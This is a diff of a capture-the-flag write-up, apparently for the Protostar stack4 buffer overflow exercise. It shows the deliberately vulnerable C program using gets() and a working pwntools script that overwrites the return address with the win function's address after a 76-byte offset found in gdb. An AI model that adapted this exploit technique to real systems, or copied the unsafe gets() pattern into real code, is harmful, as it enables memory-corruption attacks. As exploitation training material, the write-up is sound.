@@ -1,5 +1,23 @@
+The application is a super simple buffer overflow. The c code is only a few lines. The objective is to change the return address to the win function. 
 
-## Finding Buffer Size Dynamically    
+### C Code
+
+```language-c
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+void win(){
+  printf("code flow successfully changed\n");
+}
+int main(int argc, char **argv){
+  char buffer[64];
+  gets(buffer);
+}
+```
+
+## Finding Buffer Size Dynamically 
+
 You can use `pattern_create 100 file & r < file` in gdb and you should get a seg fault. 
 ```language-gdb
 Stopped reason: SIGSEGV
@@ -11,6 +29,7 @@ Stopped reason: SIGSEGV
 So the buffer size can be found out frmo this info from the line **EIP+0 found at offset: 76** where 76 is the size of the buffer. So fill the buffer and then add the return address at the end
 
 ## Exploit Code
+
 ```language-python
 from pwn import *
 import time
@@ -52,7 +71,6 @@ def sendToGDB(payload, breakpoint=None):
 	with open('payload', 'w+') as f:
 		f.write(payload)
 	gdb.attach(r, execute="c")
-
 #====================================================="
 #						Exploit
 #======================================================
@@ -62,11 +80,9 @@ def makePayload():
 	returnAddress = p32(0x80483F4) # location of win functon
 	payload = filler + returnAddress
 	return payload
-
 def sendPayload(payload):
 	r.sendline(payload)
 	print r.recvline()
-
 if __name__=="__main__":
 	payload = makePayload()
 	sendPayload(payload)
@@ -76,15 +92,8 @@ if __name__=="__main__":
 ![Tmux is cool][exploit]
 
 
-
-[exploit]:  https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png 
-
-
-
 ## Other Notes
 	I wanted to get better at **VIM MASTERRACE** and wanted to create a template exploit python file for all similar exploits. I wanted to press f9, run the python file, and open up a gdb split window in the same terminal. Pwn tools lets you start up a local process and send input to it across a socket. You can also attach gdb to it so you can see if the return address was overwritten,  run pattern stuff as necessary, etc... It took me a while to set it up and get the settings right. See exploit picture to get a feel of what I mean
 
 
-
-
-
+[exploit]:  https://raw.githubusercontent.com/mpaxson/ctf/master/protostar/stack/stack4/exploit.png
